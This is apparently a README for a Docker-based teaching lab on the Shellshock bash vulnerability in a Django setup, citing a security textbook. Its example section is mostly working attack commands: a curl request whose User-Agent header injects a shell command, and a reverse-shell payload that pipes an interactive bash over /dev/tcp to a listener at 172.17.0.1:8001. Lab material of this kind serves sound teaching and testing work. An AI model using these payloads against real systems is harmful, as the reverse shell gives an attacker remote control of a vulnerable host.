# Shellshock Vulnerability & Django

_NOTE: Tested on Ubuntu 20.04_

## Setup

```bash
docker build -t django_shellshock .
docker run -p 8000:8000 django_shellshock
```

## Example commands

```bash
curl -A "() { echo; }; echo hello;" 127.0.0.1 > /dev/null
# Reverse shell
# terminal 1
nc -l 8001
# terminal 2 (warning: Docker Desktop users' host IP address may be different)
curl -A "() { echo; }; /bin/bash -i &>/dev/tcp/172.17.0.1/8001 0<&1;" 127.0.0.1 > /dev/null  # terminal 2
```

## Sources & Further reading

https://dwheeler.com/essays/shellshock.html

Du, Wenliang. "3. Shellshock Attack" _Computer & Internet Security: A Hands-on Approach_, 2019.